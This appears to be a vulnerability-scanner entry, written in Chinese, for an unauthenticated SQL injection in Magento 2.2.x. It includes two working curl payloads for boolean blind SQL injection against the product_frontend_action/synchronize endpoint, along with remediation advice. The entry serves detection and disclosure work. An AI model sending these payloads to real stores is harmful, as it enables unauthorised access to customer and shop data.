---
id: MAGENTO-2.2-SQLI
title: Magento 2.2 SQL注入漏洞
product: magento
vendor: Magento
version_affected: "2.2.x"
severity: HIGH
tags: [sqli, 无需认证]
fingerprint: ["Magento"]
---

## 漏洞描述

Magento 2.2.x 版本的 prepareSqlCondition 函数存在二次格式化字符串 bug，导致 SQL 注入漏洞。攻击者可以执行 SQL 盲注获取敏感数据。

## 影响版本

- Magento 2.2.x

## 前置条件

- 无需认证
- 需要能够访问 product frontend action 接口

## 利用步骤

1. 发送带有注入 payload 的请求到 catalog/product_frontend_action/synchronize

## Payload

```bash
# SQL 布尔盲注测试
curl "http://target:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-"

curl "http://target:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-"
```

## 验证方法

```bash
# 检查两个请求返回的状态码是否不同
```

## 修复建议

1. 升级 Magento 至最新版本
2. 对用户输入进行严格过滤
3. 使用 WAF 防护 SQL 注入
